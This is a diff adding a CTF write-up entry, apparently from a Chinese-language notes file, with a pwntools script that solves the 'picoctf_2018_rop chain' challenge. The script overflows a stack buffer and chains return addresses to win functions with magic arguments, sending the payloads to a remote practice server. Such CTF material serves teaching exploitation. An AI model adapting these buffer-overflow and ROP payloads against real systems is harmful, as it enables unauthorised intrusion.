@@ -368,6 +368,44 @@ if __name__ == "__main__":
     main()
 ```
 
+### picoctf_2018_rop chain
+
+[题目链接](https://buuoj.cn/challenges#picoctf_2018_rop%20chain)
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 25154
+io = remote(host,port)
+offset = 0x1C
+main = 0x804873B
+flag = 0x804862B
+win_func1 = 0x80485CB
+win_func2 = 0x80485D8
+win2_a1 = 0xBAAAAAAD     # -1163220307
+flag_a1= 0xDEADBAAD     # -559039827
+payload_1 = b'A'*offset + p32(win_func1) + p32(main)
+payload_2 = b'A'*offset + p32(win_func2) + p32(main) + p32(win2_a1)
+payload_3 = b'A'*offset + p32(flag) + p32(0) + p32(flag_a1)
+
+def main():
+    io.recvuntil(b"Enter your input> ")
+    io.sendline(payload_1)
+    io.recvuntil(b"Enter your input> ")
+    io.sendline(payload_2)
+    io.recvuntil(b"Enter your input> ")
+    io.sendline(payload_3)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+### 
+
 ## 中水区
 
 可能只有主播这种区才会觉得这里是中水区。
